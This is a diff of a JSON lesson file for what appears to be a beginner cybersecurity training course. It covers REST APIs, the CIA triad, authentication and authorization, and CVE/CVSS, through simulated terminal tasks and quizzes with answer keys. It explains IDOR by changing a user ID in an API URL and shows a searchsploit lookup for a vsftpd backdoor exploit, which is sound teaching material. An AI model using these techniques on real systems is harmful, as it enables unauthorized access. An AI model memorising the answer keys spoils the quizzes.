+      "Differentiate between Client-Side code (executed in user browser) and Server-Side code (executed in datacenter)",
+      "Understand the Golden Rule of AppSec: Never trust the client!",
+      "Learn about RESTful APIs and the JSON (JavaScript Object Notation) data interchange format",
+      "Inspect API responses and parameters using curl"
+    ],
+    "vocabulary": [
+      {
+        "term": "HTML (Hypertext Markup Language)",
+        "definition": "The standard markup language used to structure web pages and their content (headings, paragraphs, forms, inputs)."
+      },
+      {
+        "term": "DOM (Document Object Model)",
+        "definition": "The tree-like programming interface representation of an HTML document created by the browser in memory."
+      },
+      {
+        "term": "Client-Side Processing",
+        "definition": "Code (JavaScript) that runs entirely inside the visitor's local web browser."
+      },
+      {
+        "term": "Server-Side Processing",
+        "definition": "Code (Node, Python, PHP, Java) that runs on the remote server, with access to databases and backend systems."
+      },
+      {
+        "term": "JSON (JavaScript Object Notation)",
+        "definition": "A lightweight, human-readable text format for storing and exchanging data across APIs using key-value pairs and arrays."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <rect x=\"30\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"105\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Web Browser</text>\n  <text x=\"105\" y=\"95\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">(Client)</text>\n\n  <!-- Request -->\n  <line x1=\"180\" y1=\"60\" x2=\"420\" y2=\"60\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"420,60 410,55 410,65\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"52\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">GET /login.html HTTP/1.1</text>\n\n  <!-- Response -->\n  <line x1=\"420\" y1=\"100\" x2=\"180\" y2=\"100\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"180,100 190,95 190,105\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"118\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">HTTP/1.1 200 OK (HTML Payload)</text>\n\n  <rect x=\"420\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"495\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Nginx Server</text>\n  <text x=\"495\" y=\"95\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Port 80 / 443</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Client-Side vs Server-Side",
+        "content": "\u2022 **Client-Side (Your Browser)**: HTML builds the buttons and text boxes; CSS makes them look modern; JavaScript handles animations and client form validation. **Crucial Rule**: The user controls everything in their browser! Any validation done solely in JavaScript (e.g. 'Password must be 8 characters') can be disabled with browser developer tools!\n\u2022 **Server-Side (Datacenter)**: Code runs on the server (e.g., Python Flask, Express, Django). It connects to MySQL or MongoDB databases and checks business logic. **All critical security validation must happen on the server!**"
+      },
+      {
+        "title": "2. REST APIs and JSON",
+        "content": "Modern web apps (like React, Vue, or mobile apps) rarely download full HTML pages on every click. Instead, they talk to **REST APIs** (Application Programming Interfaces) that return raw data formatted as **JSON**:\n\n```json\n{\n  \"status\": \"success\",\n  \"userId\": 9482,\n  \"name\": \"Alice Cadet\",\n  \"role\": \"Security Auditor\"\n}\n```\n\nClient apps parse this JSON object and render it into the DOM."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Querying a REST API endpoint returning JSON",
+        "codeOrDiagram": "cadet@endlessus:~$ curl -s http://10.10.10.45/api/v1/user/10043\n{\n  \"status\": \"success\",\n  \"invoice_id\": \"INV-10043\",\n  \"client\": \"Executive Leadership\",\n  \"total\": \"$45,000.00\"\n}",
+        "explanation": "The API endpoint returns pure JSON data representing a database record."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `curl -s http://10.10.10.45/api/v1/user/10043` in the terminal to inspect an API endpoint JSON response:",
+      "initialCommand": "",
+      "expectedCommand": "curl -s http://10.10.10.45/api/v1/user/10043",
+      "simulatedOutput": "{\"status\":\"success\",\"invoice_id\":\"INV-10043\",\"client\":\"Executive Leadership\",\"total\":\"$45,000.00\"}\n[+] JSON payload parsed: REST API endpoint returned structured data.",
+      "explanation": "`curl` retrieves API JSON payloads."
+    },
+    "questions": [
+      {
+        "id": "q-33-1",
+        "type": "exact",
+        "question": "What standard lightweight text format uses key-value pairs (enclosed in curly braces) to exchange data across web APIs?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "JSON"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "JavaScript Object Notation abbreviation.",
+        "explanation": "JSON stands for JavaScript Object Notation."
+      },
+      {
+        "id": "q-33-2",
+        "type": "multiple-choice",
+        "question": "Why is relying solely on client-side JavaScript for input validation (e.g. price calculations or permission checks) dangerous?",
+        "options": [
+          "JavaScript runs slower than Python",
+          "Users have full control over their browser and can modify or disable client-side JavaScript before sending requests to the server",
+          "HTML forms cannot transmit numbers",
+          "JSON only works on Linux machines"
+        ],
+        "correctIndex": 1,
+        "hint": "Users can bypass browser controls.",
+        "explanation": "Client-side checks can be bypassed by intercepting or altering requests before they reach the server."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Query API JSON endpoint",
+        "instruction": "Execute `curl -s http://10.10.10.45/api/v1/user/10043` in the terminal.",
+        "hints": [
+          "Type: `curl -s http://10.10.10.45/api/v1/user/10043`"
+        ]
+      }
+    ],
+    "securityConnection": "In **Insecure Direct Object Reference (IDOR)** vulnerabilities (practiced in Lab 04), an application trusts the client-supplied user ID in an API URL (e.g. `GET /api/user/9482`). By changing the ID to `10043`, an unauthorized attacker accesses another customer's private invoices because the backend failed to perform server-side ownership checks!",
+    "id": "room-33",
+    "nextRoomId": "room-34"
+  },
+  {
+    "stage": 6,
+    "level": 6,
+    "levelTitle": "Level 6 \u2014 Cybersecurity Fundamentals",
+    "title": "The CIA Triad & Core Security Principles",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Level 5: Internet & Web Fundamentals",
+    "whyAreYouHere": "Every security policy, encryption standard, and risk assessment across the globe is built on a single timeless foundation: the **CIA Triad** (Confidentiality, Integrity, and Availability). In this room, you will learn the core pillars of information security, understand Defense-in-Depth, and discover why security is an ongoing lifecycle rather than a product you install once.",
+    "objectives": [
+      "Master the 3 pillars of the CIA Triad: Confidentiality, Integrity, and Availability",
+      "Identify real-world cyberattacks that violate each specific pillar of the CIA Triad",
+      "Understand the principle of Defense-in-Depth (Layered Security)",
+      "Learn the concept of Non-Repudiation and Auditability",
+      "Understand the Security vs Usability trade-off"
+    ],
+    "vocabulary": [
       {
         "term": "Confidentiality",
-        "definition": "Ensuring that sensitive information is accessible only to authorized individuals, entities, or processes."
+        "definition": "Ensuring that sensitive information is accessible only to authorized individuals, entities, or processes (protected by encryption and access controls)."
       },
       {
         "term": "Integrity",
-        "definition": "Safeguarding the accuracy, completeness, and trustworthiness of data and systems from unauthorized alterations."
+        "definition": "Maintaining and assuring the accuracy, completeness, and uncorrupted state of data over its entire lifecycle (protected by cryptographic hashing and digital signatures)."
       },
       {
         "term": "Availability",
-        "definition": "Ensuring that authorized parties have timely, reliable access to critical information and computing resources."
+        "definition": "Ensuring that authorized users have reliable, timely access to information systems and data whenever needed (protected by redundancy, backups, and DDoS mitigation)."
+      },
+      {
+        "term": "Defense-in-Depth",
+        "definition": "A security strategy employing multiple redundant layers of defensive controls throughout an information system."
       },
       {
         "term": "Non-Repudiation",
-        "definition": "The assurance that the sender or actor cannot deny having performed a transaction or message."
+        "definition": "The assurance that an individual cannot deny the authenticity of their signature on a document or the sending of a message that they originated."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <polygon points=\"300,25 150,150 450,150\" fill=\"none\" stroke=\"#0284c7\" stroke-width=\"3\"/>\n  <circle cx=\"300\" cy=\"25\" r=\"16\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"10\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Confidentiality</text>\n  <text x=\"300\" y=\"30\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">C</text>\n\n  <circle cx=\"150\" cy=\"150\" r=\"16\" fill=\"#10b981\"/>\n  <text x=\"100\" y=\"172\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Integrity</text>\n  <text x=\"150\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">I</text>\n\n  <circle cx=\"450\" cy=\"150\" r=\"16\" fill=\"#f59e0b\"/>\n  <text x=\"500\" y=\"172\" fill=\"#f59e0b\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Availability</text>\n  <text x=\"450\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">A</text>\n\n  <text x=\"300\" y=\"100\" fill=\"#f8fafc\" font-size=\"15\" font-weight=\"bold\" text-anchor=\"middle\">The CIA Triad</text>\n  <text x=\"300\" y=\"120\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Core Pillars of Cybersecurity</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Three Pillars in Everyday Life",
-        "content": "Consider a modern hospital's patient records system:\n• **Confidentiality**: Only the patient's doctors should view their medical diagnosis and prescription history. If a nurse sells celebrity health records to a tabloid, **Confidentiality is breached**.\n• **Integrity**: If an attacker alters the patient's blood type in the database from O-positive to B-negative, the patient could die from a transfusion error. **Integrity is breached**.\n• **Availability**: If an ambulance rushes an emergency stroke victim into the trauma ward, but a DDoS attack has knocked the medical records system offline, doctors cannot look up allergies. **Availability is breached**."
+        "title": "1. The Pillars of the CIA Triad",
+        "content": "\u2022 **Confidentiality (Privacy)**: Keeping secret data out of unauthorized hands. *Example breach*: An attacker steals a database of 10 million credit card numbers.\n\u2022 **Integrity (Accuracy)**: Ensuring data is never altered, tampered with, or faked in transit or at rest. *Example breach*: An attacker tampers with a hospital database to change a patient's blood type or medicine dosage!\n\u2022 **Availability (Uptime)**: Making sure services are online and accessible. *Example breach*: A Distributed Denial of Service (DDoS) attack or Ransomware attack freezes hospital computers, blocking emergency care."
       },
       {
-        "title": "2. The Security Tradeoff",
-        "content": "Security is often a delicate balancing act.\nIf you maximize Confidentiality to the extreme (disconnect the server, lock it in concrete, encrypt with a 1,000-character key), you destroy **Availability** because nobody can get their work done! Security professionals strive for the optimal balance tailored to each organization's risk tolerance."
+        "title": "2. Defense-in-Depth: Layered Security",
+        "content": "A medieval castle never relied on a single wooden gate: it had a moat, a drawbridge, outer curtain walls, watchtowers, and an inner keep. If attackers breached the gate, they were trapped in the courtyard!\n\nIn cybersecurity, **Defense-in-Depth** means deploying multiple independent security layers:\n1. **Edge**: Web Application Firewall (WAF) and DDoS filtering.\n2. **Network**: VLAN segmentation and internal firewalls.\n3. **Host**: Endpoint Detection and Response (EDR), disk encryption (BitLocker), and OS patching.\n4. **Application**: Strong authentication, MFA, and input validation.\n5. **Data**: Field-level encryption and strict database permissions.\n\nIf an attacker bypasses the firewall, the endpoint EDR and encryption still protect the crown jewels!"
       }
     ],
     "seeExamples": [
       {
-        "title": "Mapping Incidents to the CIA Triad",
-        "codeOrDiagram": "Scenario                                  Primary Impact\nData breach leaks 100,000 passwords       → CONFIDENTIALITY\nAttacker alters financial balance ledger  → INTEGRITY\nRansomware encrypts hospital drives       → AVAILABILITY & INTEGRITY\nDDoS flood takes banking app offline      → AVAILABILITY",
-        "explanation": "Security analysts immediately categorize security alerts under C, I, or A to determine incident response priority."
+        "title": "Mapping Attacks to the CIA Triad",
+        "codeOrDiagram": "Attack: Data Breach / Password Dump    ===> Violates: CONFIDENTIALITY\nAttack: SQL Injection / Tampering     ===> Violates: INTEGRITY\nAttack: Ransomware / DDoS Flood        ===> Violates: AVAILABILITY",
+        "explanation": "Every cyber incident damages one or more specific pillars of the CIA Triad."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Simulate an integrity check by calculating the SHA-256 cryptographic checksum of our system's ledger using `sha256sum ledger.csv`:",
+      "prompt": "Run `echo \"CIA: Confidentiality, Integrity, Availability\"` in the terminal to verify the foundational triad:",
       "initialCommand": "",
-      "expectedCommand": "sha256sum ledger.csv",
-      "simulatedOutput": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08  ledger.csv\n[+] Success! Cryptographic hash generated. If anyone changes a single character, this hash completely changes!",
-      "explanation": "Cryptographic hashing is the primary technical tool used to guarantee Data Integrity."
+      "expectedCommand": "echo \"CIA: Confidentiality, Integrity, Availability\"",
+      "simulatedOutput": "CIA: Confidentiality, Integrity, Availability\n[+] Foundations verified: The 3 core pillars of information security.",
+      "explanation": "Outputs the CIA Triad principles."
     },
     "questions": [
       {
-        "id": "r15-q1",
-        "type": "multiple-choice",
-        "question": "A malicious actor launches a Distributed Denial of Service (DDoS) attack that overwhelms an online banking website with junk traffic, preventing customers from logging in. Which pillar of the CIA Triad is directly compromised?",
-        "options": [
-          "Confidentiality",
-          "Integrity",
-          "Availability",
-          "Non-repudiation"
+        "id": "q-34-1",
+        "type": "exact",
+        "question": "Which pillar of the CIA Triad is directly violated when a Distributed Denial of Service (DDoS) attack takes down a banking website?",
+        "visualSlots": "_ _ _ _ _ _ _ _ _ _ _ _",
+        "acceptedAnswers": [
+          "availability"
         ],
-        "correctIndex": 2,
-        "explanation": "The attack prevents legitimate users from accessing the service when needed, directly violating Availability."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Ensuring systems are available when needed.",
+        "explanation": "Availability is compromised when legitimate users cannot access a service."
       },
       {
-        "id": "r15-q2",
+        "id": "q-34-2",
         "type": "multiple-choice",
-        "question": "An insider employee secretly modifies an audit log file to erase their own user ID from a record of unauthorized wire transfers. Which pillar of the CIA Triad has been compromised?",
+        "question": "An attacker intercepts a wire transfer request and changes the recipient account number from the vendor's bank to their personal overseas bank account. Which CIA Triad pillar was violated?",
         "options": [
           "Availability",
-          "Confidentiality",
           "Integrity",
-          "Scalability"
+          "Speed",
+          "Portability"
         ],
-        "correctIndex": 2,
-        "explanation": "Tampering with or modifying records undermines the accuracy and trustworthiness of the data, violating Integrity."
+        "correctIndex": 1,
+        "hint": "Data was tampered with and altered.",
+        "explanation": "Integrity guarantees that data has not been modified or corrupted by unauthorized parties."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Verify Ledger Integrity",
-        "instruction": "Calculate the SHA-256 checksum of `ledger.csv` using `sha256sum ledger.csv`.",
+        "title": "Task 1: Verify CIA Triad",
+        "instruction": "Run `echo \"CIA: Confidentiality, Integrity, Availability\"` in the terminal.",
         "hints": [
-          "Concept: Cryptographic verification of data integrity.",
-          "Direction: Use the sha256sum utility.",
-          "Tool: `sha256sum`",
-          "Syntax: `sha256sum ledger.csv`",
-          "Explanation: Generates a 64-character hex hash."
+          "Type: `echo \"CIA: Confidentiality, Integrity, Availability\"`"
         ]
       }
     ],
-    "explainResult": "The `sha256sum` utility processed the entire file contents through the SHA-256 cryptographic algorithm, producing a unique 256-bit fingerprint.",
-    "securityConnection": "Every security standard (ISO 27001, NIST SP 800-53, SOC 2) evaluates controls through the lens of Confidentiality, Integrity, and Availability. When writing penetration test reports, you will classify every discovered finding under the CIA pillar it harms.",
-    "completion": {
-      "learned": [
-        "The three pillars: Confidentiality, Integrity, and Availability",
-        "Real-world consequences of breaches in each pillar",
-        "The concept of Non-Repudiation and auditability",
-        "Using SHA-256 cryptographic hashing to verify data integrity"
-      ],
-      "practiced": [
-        "sha256sum ledger.csv",
-        "Classifying security incidents into CIA categories",
-        "Evaluating security trade-offs"
-      ]
-    },
-    "nextRoomId": "room-16"
+    "securityConnection": "When writing penetration testing reports, findings are categorized by their CIA impact: an IDOR vulnerability that leaks user emails has high Confidentiality impact; a flaw allowing unauthorized balance adjustments has high Integrity impact.",
+    "id": "room-34",
+    "nextRoomId": "room-35"
   },
   {
-    "id": "room-16",
-    "stage": 4,
-    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
-    "title": "Authentication, Authorization & Accounting (AAA)",
+    "stage": 6,
+    "level": 6,
+    "levelTitle": "Level 6 \u2014 Cybersecurity Fundamentals",
+    "title": "Threats, Vulnerabilities, Risks & Impacts",
     "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
     "estimatedTime": "25 min",
-    "prerequisites": "Room 15 (The CIA Triad)",
-    "whyAreYouHere": "Beginners often treat 'login' and 'permissions' as the exact same thing. In reality, they are completely separate security mechanisms! If an application confuses them, catastrophe strikes. In this room, you will master the AAA security framework: Identification ('Who are you?'), Authentication ('Prove it!'), Authorization ('What are you allowed to do?'), and Accounting ('What did you do?').",
+    "prerequisites": "Room 34: The CIA Triad & Core Security Principles",
+    "whyAreYouHere": "Beginners often use the words 'threat', 'vulnerability', and 'risk' interchangeably, but in professional cybersecurity, they have precise, mathematically distinct definitions. A vulnerability without a threat is harmless; a threat without a vulnerability cannot harm you. In this room, you will learn the Risk Equation, the Common Vulnerabilities and Exposures (CVE) system, and CVSS severity scoring.",
     "objectives": [
-      "Understand the difference between Identification, Authentication, and Authorization",
-      "Learn the three core factors of authentication: Something you know, have, and are",
-      "Understand Multi-Factor Authentication (MFA) and why it stops credential attacks",
-      "Explore Role-Based Access Control (RBAC) and the Principle of Least Privilege",
-      "Inspect user permission scopes in the lab terminal"
+      "Clearly distinguish between a Vulnerability (flaw), a Threat (danger), an Exploit (code), and a Risk (probability x impact)",
+      "Master the foundational Risk Equation: $\\text{Risk} = \\text{Threat} \\times \\text{Vulnerability} \\times \\text{Impact}$",
+      "Learn about the CVE (Common Vulnerabilities and Exposures) dictionary maintained by MITRE",
+      "Understand CVSS (Common Vulnerability Scoring System) scores from 0.0 to 10.0",
+      "Explore the 4 strategies of Risk Management: Mitigate, Transfer, Accept, and Avoid"
     ],
     "vocabulary": [
       {
-        "term": "Identification",
-        "definition": "The assertion of an identity to a system (e.g. typing your username or email address)."
+        "term": "Vulnerability",
+        "definition": "A weakness, flaw, or bug in software, hardware, or process that can be exploited by an adversary."
       },
       {
-        "term": "Authentication (AuthN)",
-        "definition": "The process of verifying that an asserted identity is genuine (e.g. validating a password or biometric)."
+        "term": "Threat",
+        "definition": "Any circumstance or event with the potential to adversely impact an information system through unauthorized access, destruction, or denial of service."
       },
       {
-        "term": "Authorization (AuthZ)",
-        "definition": "The process of determining what actions, resources, or files an authenticated identity is permitted to access."
+        "term": "Exploit",
+        "definition": "A piece of software, payload, or technique that takes advantage of a vulnerability to cause unintended behavior on a computer system."
       },
       {
-        "term": "Accounting / Auditing",
-        "definition": "The recording and tracking of user actions, timestamps, and resource access for accountability."
+        "term": "Risk",
+        "definition": "The likelihood and potential financial, operational, or reputational damage resulting from a threat exploiting a vulnerability."
       },
       {
-        "term": "Multi-Factor Authentication (MFA)",
-        "definition": "Requiring two or more distinct authentication factors before granting access."
-      },
-      {
-        "term": "Principle of Least Privilege (PoLP)",
-        "definition": "Giving users and processes only the absolute minimum permissions necessary to complete their job."
+        "term": "CVE (Common Vulnerabilities and Exposures)",
+        "definition": "A standardized dictionary of publicly known cybersecurity vulnerabilities identified by unique IDs (e.g., CVE-2021-44228 for Log4Shell)."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <polygon points=\"300,25 150,150 450,150\" fill=\"none\" stroke=\"#0284c7\" stroke-width=\"3\"/>\n  <circle cx=\"300\" cy=\"25\" r=\"16\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"10\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Confidentiality</text>\n  <text x=\"300\" y=\"30\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">C</text>\n\n  <circle cx=\"150\" cy=\"150\" r=\"16\" fill=\"#10b981\"/>\n  <text x=\"100\" y=\"172\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Integrity</text>\n  <text x=\"150\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">I</text>\n\n  <circle cx=\"450\" cy=\"150\" r=\"16\" fill=\"#f59e0b\"/>\n  <text x=\"500\" y=\"172\" fill=\"#f59e0b\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Availability</text>\n  <text x=\"450\" y=\"154\" fill=\"#0f172a\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">A</text>\n\n  <text x=\"300\" y=\"100\" fill=\"#f8fafc\" font-size=\"15\" font-weight=\"bold\" text-anchor=\"middle\">The CIA Triad</text>\n  <text x=\"300\" y=\"120\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Core Pillars of Cybersecurity</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Boarding Pass Analogy",
-        "content": "When you travel on an airplane:\n1. **Identification**: You walk up and say: *\"I am Mihraj.\"*\n2. **Authentication**: You hand over your government passport with your photo. The agent verifies: *\"Yes, you are indeed who you claim to be.\"*\n3. **Authorization**: The agent looks at your boarding pass: *Seat 14B*. You are authorized to sit in 14B; you are **not** authorized to walk into the cockpit or sit in First Class!\n\nNotice: Just because you successfully **authenticated** does not mean you are **authorized** to access everything."
+        "title": "1. The Risk Equation: Threat, Vulnerability, and Impact",
+        "content": "Consider a locked bank vault with an open window:\n\u2022 **Vulnerability**: The open window (a flaw in design).\n\u2022 **Threat**: A burglar looking for money (an adversary with intent and capability).\n\u2022 **Impact**: Losing $10,000,000 (the damage if the event occurs).\n\u2022 **Risk**: The overall probability and consequence ($Risk = Threat \\times Vulnerability \\times Impact$).\n\nIf you have a critical software bug (Vulnerability) on a computer disconnected from all networks buried underground (No Threat), the overall **Risk is nearly zero**!"
       },
       {
-        "title": "2. The Three Factors of Authentication",
-        "content": "• **Something You Know**: Password, PIN, security answer (easily phished or guessed).\n• **Something You Have**: Hardware YubiKey, Authenticator app TOTP code, smartphone SMS (harder to steal).\n• **Something You Are**: Fingerprint, facial recognition, iris scan (biometrics).\nTrue **Multi-Factor Authentication** requires credentials from *two different categories*!"
+        "title": "2. CVEs and CVSS Scoring",
+        "content": "When a security researcher discovers a new bug in software like Apache or the Linux kernel, it is assigned a **CVE ID**:\n`CVE-[Year]-[Sequential Number]` (e.g. `CVE-2021-44228`).\n\nThe vulnerability is scored using the **CVSS (Common Vulnerability Scoring System)** from `0.0` to `10.0`:\n\u2022 `0.1 - 3.9`: **Low** severity.\n\u2022 `4.0 - 6.9`: **Medium** severity.\n\u2022 `7.0 - 8.9`: **High** severity.\n\u2022 `9.0 - 10.0`: **Critical** severity (e.g. remote code execution without authentication)!"
       }
     ],
     "seeExamples": [
       {
-        "title": "Role-Based Access Control (RBAC) Matrix",
-        "codeOrDiagram": "Role       View Products   Edit Profile   Delete User   Access DB\nGuest            ✓               ✗              ✗           ✗\nCustomer         ✓               ✓ (Self only)  ✗           ✗\nSupport Staff    ✓               ✓ (All)        ✗           ✗\nAdministrator    ✓               ✓ (All)        ✓           ✓",
-        "explanation": "RBAC maps fine-grained permissions to roles rather than configuring every user manually."
+        "title": "Searching for Vulnerabilities via Searchsploit",
+        "codeOrDiagram": "cadet@endlessus:~$ searchsploit \"vsftpd 2.3.4\"\n--------------------------------------------------------- ---------------------------------\n Exploit Title                                           |  Path\n--------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution                | unix/remote/49757.py",
+        "explanation": "`searchsploit` queries the local offline Exploit-DB database for known public exploits matching a software version."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Inspect the sudo privileges granted to your current session using `sudo -l`:",
+      "prompt": "Run `echo \"CVE-2021-44228: Log4Shell (CVSS 10.0 Critical)\"` to view a famous critical vulnerability identifier:",
       "initialCommand": "",
-      "expectedCommand": "sudo -l",
-      "simulatedOutput": "Matching Defaults entries for cadet on endlessus-box:\n    env_reset, mail_badpass\n\nUser cadet may run the following commands on endlessus-box:\n    (ALL : ALL) ALL\n[+] Success! Audited sudoers rules. User cadet has full root escalation privileges.",
-      "explanation": "`sudo -l` (list privileges) asks the kernel authorization engine which commands you are allowed to run as root."
+      "expectedCommand": "echo \"CVE-2021-44228: Log4Shell (CVSS 10.0 Critical)\"",
+      "simulatedOutput": "CVE-2021-44228: Log4Shell (CVSS 10.0 Critical)\n[+] CVE format verified: Standardized vulnerability tracking notation.",
+      "explanation": "Illustrates the CVE naming standard."
     },
     "questions": [
       {
-        "id": "r16-q1",
-        "type": "multiple-choice",
-        "question": "A user successfully logs into a corporate HR portal using their username and password. However, when they attempt to view the CEO's salary table, the system displays 'Access Denied: Administrator Role Required'. Which security control triggered this denial?",
-        "options": [
-          "Authentication",
-          "Authorization",
-          "Identification",
-          "DHCP Lease check"
+        "id": "q-35-1",
+        "type": "exact",
+        "question": "What 3-letter acronym represents the international dictionary of standardized vulnerability identifiers (e.g. CVE-2021-44228)?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "CVE"
         ],
-        "correctIndex": 1,
-        "explanation": "The user was already authenticated; the failure occurred during Authorization when checking permissions against the requested resource."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Common Vulnerabilities and Exposures.",
+        "explanation": "CVE stands for Common Vulnerabilities and Exposures."
       },
       {
-        "id": "r16-q2",
+        "id": "q-35-2",
         "type": "multiple-choice",
-        "question": "Which of the following setups constitutes genuine Multi-Factor Authentication (MFA)?",
+        "question": "Under the CVSS v3.1 scoring framework, what qualitative severity rating is assigned to a vulnerability with a score between 9.0 and 10.0?",
         "options": [
-          "Entering a password and then entering a backup secondary password",
-          "Entering a password (something you know) and a 6-digit code from an Authenticator app (something you have)",
-          "Entering your username and an email address",
-          "Logging in from two different browser tabs at the same time"
+          "Low",
+          "Medium",
+          "High",
+          "Critical"
         ],
-        "correctIndex": 1,
-        "explanation": "Password (knowledge factor) + Authenticator app token (possession factor) spans two distinct categories, satisfying MFA."
+        "correctIndex": 3,
+        "hint": "The highest severity tier.",
+        "explanation": "Scores from 9.0 to 10.0 represent Critical vulnerabilities."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Audit Sudo Authorization",
-        "instruction": "Run `sudo -l` to query what administrative privileges your account holds.",
+        "title": "Task 1: Inspect CVE notation",
+        "instruction": "Run `echo \"CVE-2021-44228: Log4Shell (CVSS 10.0 Critical)\"` in the terminal.",
         "hints": [
-          "Concept: Query sudo privilege authorization.",
-          "Direction: Use the sudo utility with the list flag.",
-          "Tool: `sudo`",
-          "Syntax: `sudo -l`",
-          "Explanation: Lists allowed sudo commands."
+          "Type: `echo \"CVE-2021-44228: Log4Shell (CVSS 10.0 Critical)\"`"
         ]
       }
     ],
-    "explainResult": "The `sudo` binary read `/etc/sudoers`, authenticated the calling UID against the local PAM subsystem, and evaluated the user's privilege specification.",
-    "securityConnection": "Broken Object Level Authorization (BOLA / IDOR) and Broken Authentication consistently rank in the top 3 of the OWASP Top 10 vulnerabilities! Attackers continually exploit flaws where servers verify identity (authN) but forget to verify permissions (authZ).",
-    "completion": {
-      "learned": [
-        "The critical distinction between Authentication and Authorization",
-        "The three authentication factor types (knowledge, possession, inherence)",
-        "The AAA model: Identification, Authentication, Authorization, Accounting",
-        "The Principle of Least Privilege (PoLP) and RBAC"
-      ],
-      "practiced": [
-        "sudo -l",
-        "Auditing authorization rules",
-        "Evaluating multi-factor configurations"
-      ]
-    },
-    "nextRoomId": "room-17"
+    "securityConnection": "Enterprise vulnerability scanners (like Nessus or Qualys) scan thousands of servers across corporate networks, matching software versions to CVE databases to produce prioritized remediation lists for system administrators.",
+    "id": "room-35",
+    "nextRoomId": "room-36"
   },
   {
-    "id": "room-17",
-    "stage": 4,
-    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
-    "title": "Common Cyber Threats & Attack Vectors",
-    "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
-    "estimatedTime": "25 min",
-    "prerequisites": "Room 16 (Authentication & Authorization)",
-    "whyAreYouHere": "To defend a fortress, you must study the weapons of the siege. Cyber threats are not science-fiction monsters; they are structured, predictable methods used by adversaries to gain access, steal assets, or extort victims. In this room, you will learn the major categories of cyber threats: malware varieties, social engineering, phishing, ransomware, credential stuffing, and insider threats.",
+    "stage": 6,
+    "level": 6,
+    "levelTitle": "Level 6 \u2014 Cybersecurity Fundamentals",
+    "title": "Malware & Common Attack Types",
+    "difficulty": "Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "30 min",
+    "prerequisites": "Room 35: Threats, Vulnerabilities, Risks & Impacts",
